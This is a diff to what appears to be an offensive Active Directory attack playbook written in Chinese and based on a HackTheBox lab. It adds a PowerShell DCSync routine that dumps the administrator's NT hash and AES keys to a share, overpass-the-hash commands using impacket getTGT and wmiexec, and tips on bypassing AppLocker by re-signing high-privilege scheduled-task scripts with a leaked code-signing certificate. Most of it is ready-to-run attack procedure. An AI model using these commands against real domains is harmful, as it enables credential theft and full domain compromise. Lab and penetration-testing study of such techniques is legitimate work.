@@ -33,6 +33,12 @@ Step 5 服务密文（Jenkins / VNC 注册表 / ERRORLOG / pfx）→ §7 离线�
 3. **BH 边可能过期**：`Owns` 边只是采集时刻的 owner 字段。动手前读目标的 `nTSecurityDescriptor` 实锤——**在已正确请求该属性的前提下读不到它 = 当前不是 owner**（owner 隐含 `READ_CONTROL`；反向不成立：非 owner 也可能被显式授予 `READ_CONTROL` 而读到）。
 4. **工具命名（Kali 打包版）**：`impacket-<name>`（没有裸 `*.py`）、`certipy-ad`（不是 `certipy`）、`bloodyad`（全小写，不是 `bloodyAD`）。名字写错会浪费一轮实验。
 5. **NTLM 报错三态判读**：`STATUS_LOGON_FAILURE` = 凭据错或该域 NTLM 全禁；`STATUS_ACCOUNT_RESTRICTION` = **密码已验证正确**、仅登录方式被策略拦（Protected Users）；用 NT hash 取票报 `KDC_ERR_ETYPE_NOSUPP` = 账号在 Protected Users / 仅允许 AES，改用 ccache 或 pfx，别再拿 hash 试。
+6. **执行受限主机**（AppLocker 白名单 + 防火墙按程序拦出站 + 文件被周期还原，"落地 exe 再反连"直接作废）→ Read `references/notes/windows-hardened-execution.md`：DLL 劫持四步法、宿主内执行、代码签名证书重签高权脚本、把多步链塞进 DLL 抢时间窗、DCSync-from-Windows 与 NTLM 禁用时的 overpass-the-hash。与本文件的分工：本文件负责**拿凭据/改权限**，那份负责**在执行被封的宿主里把动作真正跑起来**。
+
+### 0.2 与 AD 链的两个接口（HTB-Hathor 实测）
+
+- **SMB 签名强制（`Message signing enabled and required`）**：中继认证到 SMB 不成立（中继者无会话密钥、无法签名），但**不影响用有效凭据正常登录**；需要中继时把目标换成 LDAP / ADCS(HTTP) 等不校验 SMB 签名的服务。
+- **拿到下一个域身份的最短路径常常是"计划任务脚本"**：若存在一个**签名过 AppLocker 的脚本**由计划任务以高权账号运行（触发方式可能是事件日志），改它 + 用泄漏的代码签名证书重签，即可借它的高权上下文执行 —— 详见上述 note §5。
 
 ## 1. 立足后侦察（BloodHound + AD 回收站）
 
@@ -168,6 +174,22 @@ $cred.GetNetworkCredential().UserName
 $cred.GetNetworkCredential().Password
 ```
 桌面/文档目录的 *.xml（cred/connection 命名）先按此法试，多数是 Export-Clixml 的 PSCredential。
+
+### 2.8 从域内 Windows 主机执行 DCSync（DSInternals，不落地工具）
+
+```powershell
+Import-Module DSInternals -ErrorAction SilentlyContinue
+"IDENTITY: $(whoami)" | Out-File -Encoding utf8 C:\Programdata\dc.txt
+Get-ADReplAccount -SamAccountName administrator -Server <DC FQDN> 2>&1 | Out-File -Append -Encoding utf8 C:\Programdata\dc.txt
+Copy-Item C:\Programdata\dc.txt C:\<可读共享>\dc.txt -Force
+```
+来源：HTB-Hathor（2026-09-21 实测）
+
+- 需要运行账号具备 `Replicating Directory Changes` / `...All` —— **口令审计类工具的运行账号通常天然具备**（工具本身就是靠复制协议读取密码哈希），无需先成为域管。
+- 输出含 `NTHash`、`NTHashHistory` 与 `KerberosNew.AES256/AES128 Key`：**RC4 被禁时用 AES key 走 keytab/`ktutil` 取票**，别只留 NT hash。
+- 结果先写 `C:\Programdata` 再回抄共享，避免依赖交互 shell；开头写一行 `IDENTITY: $(whoami)` 自证执行身份。
+- **NTLM 禁用 ⇒ 不能 PTH**，改走 overpass-the-hash：`impacket-getTGT <domain>/Administrator -hashes :<NT> -dc-ip <ip>` → `export KRB5CCNAME=<user>.ccache` → `impacket-wmiexec -k -no-pass <domain>/Administrator@<DC FQDN>`。
+- 与 §5.5 KrbRelay 的分界：**账号自己有复制权限**就直接用本节；只有"能中继机器账户"的条件时才走 §5.5。
 
 ## 3. ACL 滥用提权（BloodHound 找边后逐类打）
 
